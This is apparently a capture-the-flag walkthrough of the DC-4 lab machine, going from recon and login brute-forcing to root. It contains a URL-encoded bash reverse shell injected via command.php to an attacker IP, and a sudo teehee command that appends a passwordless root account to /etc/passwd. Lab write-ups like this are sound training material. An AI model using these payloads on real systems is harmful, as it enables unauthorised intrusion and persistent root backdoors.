# DC-4: Machine Notes

## Recon

### Nmap
- Port 22/tcp: SSH (OpenSSH 7.4p1)
- Port 80/tcp: HTTP (nginx 1.15.10)

### Web Enumeration
- Application: "System Tools" login page.
- Brute forced the login: `admin` : `happy`.

## Initial Access

### Command Injection
- After login, `command.php` allows running system commands via a radio button.
- Intercepted the request and injected a reverse shell:
```http
radio=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F[KALI_IP]%2F4444%200%3E%261%27&submit=Run
```
- Gained `www-data` shell.

## Lateral Movement

### jim (Password List)
- Found `/home/jim/backups/old-passwords.bak`.
- Used this list to brute force SSH for user `jim`.
- Result: `jim` : `jibril04`.

### charles (Local Mail)
- Checked local mail for `jim`: `/var/mail/jim`.
- Found an email from `charles` containing his password:
- `charles` : `^xHhA&hvim0y`.

## Privilege Escalation

### Sudo Abuse (teehee)
- `sudo -l` for `charles`:
  - `(root) NOPASSWD: /usr/bin/teehee`
- `teehee` is a version of `tee` that can write to files.
- Abuse it to create a new root-level user in `/etc/passwd`:
```bash
echo "toor::0:0:root:/root:/bin/bash" | sudo /usr/bin/teehee -a /etc/passwd
```
- The empty field between `toor:` and `:0` means no password is required.
- Switch to the new user:
```bash
su toor
```
- Result: **Root shell**.
